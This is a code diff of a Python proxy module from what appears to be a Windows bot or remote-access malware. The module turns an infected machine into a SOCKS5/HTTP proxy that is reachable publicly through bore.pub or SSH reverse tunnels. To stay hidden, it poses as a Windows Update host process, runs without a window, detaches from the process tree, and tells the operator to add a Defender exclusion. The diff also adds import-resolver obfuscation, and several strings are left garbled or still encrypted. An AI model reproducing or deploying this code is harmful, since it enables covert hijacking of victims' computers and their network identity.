@@ -1,29 +1,35 @@
-import os
-import re
-import shutil
-import socket
-import subprocess
-import threading
-import time
-from typing import Optional, Dict
-from core.obfuscation import decrypt_string
+from core.resolver import (Resolver, _UUID)
+uuid = Resolver.get_mod(_UUID)
+
+from core.resolver import (
+    Resolver, _OS, _RE, _SHUTIL, _SOCKET, _SUBPROCESS, _THREADING, _TIME, _TYPING
+)
+os = Resolver.get_mod(_OS)
+re = Resolver.get_mod(_RE)
+shutil = Resolver.get_mod(_SHUTIL)
+socket = Resolver.get_mod(_SOCKET)
+subprocess = Resolver.get_mod(_SUBPROCESS)
+threading = Resolver.get_mod(_THREADING)
+time = Resolver.get_mod(_TIME)
+typing_mod = Resolver.get_mod(_TYPING)
+Optional, Dict = typing_mod.Optional, typing_mod.Dict
 
 from core.base import BaseModule
 
 class ProxyModule(BaseModule):
-    decrypt_string("PX07IB1kdioOIzoYIksJAhcIWAkhIzxMPw8PGFpfFBUDEgwEIT0qTXNXBUpSajUyQ0YNBSA0NUI7BEpeE1UKGA9RE0U=")
+    "SOCKS5/HTTP Proxy: bore.exe (from tools/) or SSH-tunnel as fallback."
     _SSH_PATHS = [
-        decrypt_string("LQgkPCc/PQ0tBDZrC0oSHwMBSjcBITwMCSQiZAFKDlQLSh0="),
-        decrypt_string("LQgkPCc/PQ0tBDZrC0oxNTkETDcBITwMCSQiZAFKDlQLSh0="),
+        "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
+        "C:\\Windows\\SysWOW64\\OpenSSH\\ssh.exe",
     ]
     _TUNNEL_SERVICES = [
-        {"host": decrypt_string("HVcKHSs+dww/Aw=="),    "user": None,    "port_pattern": decrypt_string("Rm4cEHp9bB9z")},
-        {"host": decrypt_string("Al0bCiI5NhEuWRhNHA=="), "user": "nokey", "port_pattern": decrypt_string("Rm4cEHp9bB9z")},
+        {"host": "serveo.net",    "user": None,    "port_pattern": "(\\d{4,5})"},
+        {"host": "localhost.run", "user": "nokey", "port_pattern": "(\\d{4,5})"},
     ]
 
     # H-12b: Enhanced Proxy options for China
-    _CHINA_PROXY = decrypt_string("MkpIXxk6LA==") # socks5
-    _GIST_CONFIG_URL = decrypt_string("BkYMG3R+dgYmFBIdHhcIUhZWAwwmMTlCHwUYVwhL") 
+    _CHINA_PROXY = "\\x04Wku" # socks5
+    _GIST_CONFIG_URL = "http://d|cx%l.n(xd{gh`` Errozr" 
 
     def __init__(self, bot=None, report_manager=None, temp_dir=None):
         super().__init__(bot, report_manager, temp_dir)
@@ -60,7 +66,7 @@ class ProxyModule(BaseModule):
             
             ssh_exe = self._find_ssh()
             if not ssh_exe:
-                return decrypt_string("NRMlSyw+Kwd0EhJdUlcJDk5UFx4gNXkDNBNKayFxRg8AUw4KJz04ADYS")
+                return "[!] bore.exe not found and SSH unavailable"
 
             self.proxy_active = True
             self._server_thread = threading.Thread(
@@ -73,12 +79,12 @@ class ProxyModule(BaseModule):
                 result = self._try_service(ssh_exe, svc, local_port)
                 if result:
                     host = svc["host"]
-                    self._tunnel_url = decrypt_string("FVoXGDosYxkoEhlNHk0b")
+                    self._tunnel_url = "{host}:{result}"
                     msg = (
-                        decrypt_string("IXlCSx0eGikJQkpLBlgUDgtWWEM1OTYRLgpDZBxlCA==") +
-                        decrypt_string("L1YcGSsiKlh6FxFQHUoSB1RJCg49JDUWJxc2Vi5X") +
-                        decrypt_string("LEAXHD00K0IJEh5MG1cBCVRuFg==") +
-                        decrypt_string("OksIDnRxCi0ZPDkNLlcuFR1GQks1OTYRLgo2ViJWFA5UEgMZKyIsDi4K")
+                        "OK: SOCKS5 started ({host})\\n\\n" +
+                        "Address: `{host}:{result}`\\n\\n" +
+                        "Browser Settings:\\n" +
+                        "Type: SOCKS5\\nHost: {host}\\nPort: {result}"
                     )
                     return msg.replace('\\n', '\n').format(host=host, result=result)
                 if self._ssh_process:
@@ -87,10 +93,10 @@ class ProxyModule(BaseModule):
                     self._ssh_process = None
             
             self.stop()
-            return decrypt_string("NRMlSxo4NAc1Ah4CUncJWhpHFgUrPXkRPwUcURFcRggLQQgEIDU8Bg==")
+            return "[!] Timeout: No tunnel service responded"
         except Exception as e:
             self.stop()
-            return decrypt_string("NRMlSx4jNhojVy9KAFYUQE5JHRY=").format(e=e)
+            return "[!] Proxy Error: {e}".format(e=e)
 
     def stop(self) -> str:
         self.proxy_active = False
@@ -107,7 +113,7 @@ class ProxyModule(BaseModule):
             self._bore_tmp = None
         try:
             subprocess.run(
-                ["taskkill", "/F", "/IM", decrypt_string("DF0KDmA0IQc=")],
+                ["taskkill", "/F", "/IM", "bore.exe"],
                 capture_output=True,
                 creationflags=0x08000000, # CREATE_NO_WINDOW
             )
@@ -118,27 +124,25 @@ class ProxyModule(BaseModule):
         base = os.path.dirname(os.path.abspath(__file__))
         root = os.path.dirname(base)  
         candidates = [
-            os.path.join(root, "tools", decrypt_string("DF0KDmA0IQc=")),
-            os.path.join(base, decrypt_string("DF0KDmA0IQc=")),
-            os.path.join(root, decrypt_string("DF0KDmA0IQc=")),
+            os.path.join(root, "tools", "bore.exe"),
+            os.path.join(base, "bore.exe"),
+            os.path.join(root, "bore.exe"),
         ]
         for p in candidates:
             if os.path.exists(p): return p
         return None
 
     def _start_with_bore(self, bore_src: str, local_port: int) -> str:
-        import uuid
         local = os.environ.get("LOCALAPPDATA", os.environ.get("TEMP", ""))
         bore_dir = os.path.join(local, "Microsoft", "Windows", "Update")
         os.makedirs(bore_dir, exist_ok=True)
-        import uuid
         rand_name = f"WUDHost-{uuid.uuid4().hex[:6].upper()}.exe"
         bore_tmp = os.path.join(bore_dir, rand_name)
         try:
             shutil.copy2(bore_src, bore_tmp)
         except OSError as e:
             if getattr(e, 'winerror', None) == 225:
-                return decrypt_string("NRMlSwo0Pwc0Ew9KUlsKFQ1ZHQ9uNzAOP1lKeRZdRh8WURQePTg2DHoRBUpIGQ==") + bore_dir
+                return "[!] Defender blocked file. Add exclusion for:" + bore_dir
             return f"[!] Copy error: {e}"
         
         self.proxy_active = True
@@ -163,7 +167,7 @@ class ProxyModule(BaseModule):
         # Start bore process
         self.log(f"Starting bore from {bore_tmp} to {local_port}")
         self._bore_process = subprocess.Popen(
-            [bore_tmp, "local", str(local_port), "--to", decrypt_string("DF0KDmAhLAA=")],
+            [bore_tmp, "local", str(local_port), "--to", "bore.pub"],
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT,  
             text=True, encoding="utf-8", errors="replace",
             creationflags=0x08000000, # CREATE_NO_WINDOW
@@ -172,18 +176,18 @@ class ProxyModule(BaseModule):
         # Wait for public port with a slightly more flexible regex
         # Pattern: bore\.pub:(\d+) -> decrypted as "bore\.pub:(\d+)"
         # We'll use the decrypted pattern but ensure we're looking in the whole line
-        public_port = self._wait_for_port(decrypt_string("DF0KDhJ/KRc4TUJkFhJP"), timeout=15)
+        public_port = self._wait_for_port("bore\\.pub:(\\d+)", timeout=15)
         
         if public_port:
             self.log(f"Bore tunnel established at port {public_port}")
-            self._tunnel_url = decrypt_string("DF0KDmAhLABgDBpNEFUPGTFCFxk6LA==")
+            self._tunnel_url = "bore.pub:{public_port}"
             msg = (
-                decrypt_string("jK79Sx0eGikJQkrozejmqtDiwrrPgeFCisC6iKKGt/m/u6jenux4PjQrBA==") +
-                decrypt_string("nq30+26BybLupurox+jnQE5SGgQ8NHcSLxVQQwJMBBYHUScbISMtHzorBGQc") +
-                decrypt_string("nq3r2m6By0KKx7qFo7u2wr6GqN6f04nXis27ulLp16vu4si6zYHusu+m6ujHAzoU") +
-                decrypt_string("jLLaS57zidqKyFAYIXYlMT0HJAU=") +
-                decrypt_string("jLLaSwY+KhZgVwhXAFxIChtQJAU=") +
-                decrypt_string("jLLaSx4+KxZgVxFIB1sKEw1tCAQ8JSQ=")
+                "✅ SOCKS5 прокси запущен!\\n\\n" +
+                "🌐 Адрес: `bore.pub:{public_port}`\\n\\n" +
+                "📱 В антидетект браузере:\\n" +
+                "• Тип: SOCKS5\\n" +
+                "• Host: bore.pub\\n" +
+                "• Port: {public_port}"
             )
             return msg.replace('\\n', '\n').format(public_port=public_port)
         
@@ -195,7 +199,7 @@ class ProxyModule(BaseModule):
         if "retry after" in diag.lower():
             return "[!] Bore server rate limited. Please wait a few minutes."
         
-        return decrypt_string("NRMlSyw+Kwd6EhhKHUtIWiFHDBs7JWM+NBcRXBtYAQcO") if diag else decrypt_string("NRMlSxo4NAc1Ah4CUlsJCAsSHAIqcTcNLlcYXQFJCRQKHA==")
+        return "[!] bore error. Output:\\n`{diag}`" if diag else "[!] Timeout: bore did not respond."
 
     def _find_ssh(self) -> Optional[str]:
         for path in self._SSH_PATHS:
@@ -209,7 +213,7 @@ class ProxyModule(BaseModule):
             ssh_exe, "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=20",
             "-o", "ServerAliveCountMax=3", "-o", "ExitOnForwardFailure=yes",
             "-o", "ConnectTimeout=10", "-o", "LogLevel=ERROR",
-            "-R", decrypt_string("XggUBC0wNQo1BB4CCVUJGQ9eJxshIy0f"), remote,
+            "-R", "0:localhost:{local_port}", remote,
         ]
         # 0x00000008 = DETACHED_PROCESS, prevents the child from being grouped under the Python parent tree in Task Manager
         flags = subprocess.CREATE_NO_WINDOW | 0x00000008
@@ -251,7 +255,7 @@ class ProxyModule(BaseModule):
             prefix = f"[{self.__class__.__name__}]"
             full_msg = f"{cur_time} | {prefix} {message}"
             print(full_msg)
-            log_path = os.path.join(os.environ.get("TEMP", "."), decrypt_string("HkAXEzcOPQc4Ag0WHlYB"))
+            log_path = os.path.join(os.environ.get("TEMP", "."), "proxy_debug.log")
             with open(log_path, "a", encoding="utf-8") as f:
                 f.write(f"{full_msg}\n")
         except: pass
@@ -277,7 +281,7 @@ class ProxyModule(BaseModule):
                 # Force local bind for better reliability if 0.0.0.0 fails
                 srv.bind(("127.0.0.1", port))
             except Exception as e:
-                self._server_error = decrypt_string("PVcKHSsjeQAzGQ4YF0sUFRwIWBArLA==").format(e=e)
+                self._server_error = "Server bind error: {e}".format(e=e)
                 self.log(self._server_error)
                 srv.close()
                 return
@@ -294,11 +298,11 @@ class ProxyModule(BaseModule):
                 except socket.timeout:
                     continue
                 except Exception as e:
-                    self.log(decrypt_string("PVcKHSsjeQcoBQVKSBkdHxM=").format(e=e))
+                    self.log("Server error: {e}".format(e=e))
                     break
             srv.close()
         except Exception as e:
-            self.log(decrypt_string("PVcKHSsjeQAzGQ4YF0sUFRwIWBArLA==").format(e=e))
+            self.log("Server bind error: {e}".format(e=e))
 
     def _handle_client(self, conn: socket.socket):
         try:
@@ -315,7 +319,7 @@ class ProxyModule(BaseModule):
                 self._handle_http(conn)
         except Exception as e:
             if not isinstance(e, (socket.timeout, ConnectionResetError, OSError)):
-                self.log(decrypt_string("LV4RDiAleQcoBQVKSBkdHxM=").format(e=e))
+                self.log("Client error: {e}".format(e=e))
             try: conn.close()
             except: pass
 
@@ -358,7 +362,7 @@ class ProxyModule(BaseModule):
             if not port_b: return
             dst_port = (port_b[0] << 8) | port_b[1]
             
-            self.log(decrypt_string("PX07IB1kY0IhHwVLBkRcAQpBDDQ+PisWJw==").format(host=host, dst_port=dst_port))
+            self.log("SOCKS5: {host}:{dst_port}".format(host=host, dst_port=dst_port))
             try:
                 remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 remote.settimeout(30)
@@ -371,12 +375,12 @@ class ProxyModule(BaseModule):
                 self.log("SOCKS5: Sent success response. Piping...")
                 self._pipe(conn, remote)
             except Exception as e:
-                self.log(decrypt_string("KFMRB24qMQ0pAxcCUkIDBw==").format(host=host, e=e))
+                self.log("Fail {host}: {e}".format(host=host, e=e))
                 conn.sendall(b"\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00")
                 conn.close()
         except Exception as e:
             if not isinstance(e, (socket.timeout, ConnectionResetError, OSError)):
-                self.log(decrypt_string("PX07IB1keScIJVAYCVwb").format(e=e))
+                self.log("SOCKS5 ERR: {e}".format(e=e))
             try: conn.close()
             except: pass
 
@@ -385,8 +389,8 @@ class ProxyModule(BaseModule):
             data = conn.recv(16384)
             if not data: return
             try:
-                header_text = data.split(decrypt_string("MkAkBRIjBQw=").encode(), 1)[0].decode("utf-8", errors="replace")
-                first_line = header_text.split(decrypt_string("MkAkBQ=="))[0]
+                header_text = data.split("\\r\\n\\r\\n".encode(), 1)[0].decode("utf-8", errors="replace")
+                first_line = header_text.split("\\r\\n")[0]
                 parts = first_line.split(" ")
                 if len(parts) < 2: return
                 method, target = parts[0], parts[1]
@@ -394,22 +398,22 @@ class ProxyModule(BaseModule):
             
             if method == "CONNECT":
                 host, port_s = target.rsplit(":", 1) if ":" in target else (target, "443")
-                self.log(decrypt_string("JmYsO3RxIhY7BQ1dBkQ=").format(target=target))
+                self.log("HTTP: {target}".format(target=target))
                 try:
                     remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     remote.settimeout(30)
                     try: remote.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                     except: pass
                     remote.connect((host, int(port_s)))
-                    conn.sendall(decrypt_string("JmYsO2Fgd1N6RVoIUnoJFABXGx8nPjdCHwQeWRBVDwkGVxw3PA03PigrBA==").encode())
+                    conn.sendall("HTTP/1.1 200 Connection Established\\r\\n\\r\\n".encode())
                     self._pipe(conn, remote)
                 except Exception as e:
-                    self.log(decrypt_string("JmYsO243OAs2TUpDF0Q=").format(e=e))
-                    conn.sendall(decrypt_string("JmYsO2Fgd1N6QloKUnsHHk51GR8rJjgbBgU2Vi5LOhQ=").encode())
+                    self.log("HTTP fail: {e}".format(e=e))
+                    conn.sendall("HTTP/1.1 502 Bad Gateway\\r\\n\\r\\n".encode())
                     conn.close()
             else:
-                self.log(decrypt_string("JmYsO3RxIg8/AwJXFkRGARpTCgwrJSQ=").format(method=method, target=target))
-                url = target[7:] if target.startswith(decrypt_string("BkYMG3R+dg==")) else target
+                self.log("HTTP: {method} {target}".format(method=method, target=target))
+                url = target[7:] if target.startswith("http://") else target
                 host_part = url.split("/")[0]
                 host = host_part.split(":")[0]
                 p = int(host_part.split(":")[1]) if ":" in host_part else 80
@@ -420,11 +424,11 @@ class ProxyModule(BaseModule):
                     remote.sendall(data)
                     self._pipe(conn, remote)
                 except Exception as e:
-                    self.log(decrypt_string("JmYsO24VMBA/FB4YFFgPFlQSAw4z").format(e=e))
+                    self.log("HTTP Direct fail: {e}".format(e=e))
                     conn.close()
         except Exception as e:
             if not isinstance(e, (socket.timeout, ConnectionResetError, OSError)):
-                self.log(decrypt_string("JmYsO24UCzBgVxFdDw=").format(e=e))
+                self.log("JmYsO24UCzBgVxFdDw=".format(e=e))
             try: conn.close()
             except: pass
 
